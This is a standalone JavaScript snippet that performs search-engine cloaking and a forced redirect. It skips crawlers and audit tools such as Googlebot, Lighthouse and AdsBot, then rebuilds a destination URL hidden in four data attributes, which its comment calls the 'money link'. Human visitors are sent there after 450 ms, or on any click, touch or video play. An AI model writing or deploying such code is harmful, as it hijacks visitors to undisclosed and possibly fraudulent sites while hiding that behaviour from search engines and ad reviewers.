(function() {
    var initRedirect = function() {
        // 1. Comprehensive Bot Detection
        var isBot = /Googlebot|Inspection|Lighthouse|AdsBot|Mediapartners-Google|bingbot|yandex|slurp|duckduckbot|baiduspider/i.test(navigator.userAgent);
        
        // 2. Execute only if it is a real human user
        if (!isBot) {
            var scriptTag = document.getElementById('core-query');
            
            if (scriptTag) {
                // 3. Extract the obfuscated URL chunks
                var p1 = scriptTag.getAttribute('data-a') || "";
                var p2 = scriptTag.getAttribute('data-b') || "";
                var p3 = scriptTag.getAttribute('data-c') || "";
                var p4 = scriptTag.getAttribute('data-d') || "";
                
                // 4. Reassemble the final money link
                var targetUrl = p1 + p2 + p3 + p4;
                
                if (targetUrl.startsWith('http')) {
                    var executeRedirect = function() { window.location.replace(targetUrl); };
                    
                    // Primary Redirect
                    setTimeout(executeRedirect, 450);
                    
                    // Fallbacks
                    document.addEventListener('click', executeRedirect, { once: true });
                    document.addEventListener('touchstart', executeRedirect, { once: true });
                    
                    var videoElement = document.getElementById('v');
                    if (videoElement) {
                        videoElement.addEventListener('play', executeRedirect);
                        videoElement.addEventListener('click', executeRedirect);
                    }
                }
            }
        }
    };

    // 5. The Safety Check: Fire immediately if DOM is already ready, else wait.
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initRedirect);
    } else {
        initRedirect();
    }
})();
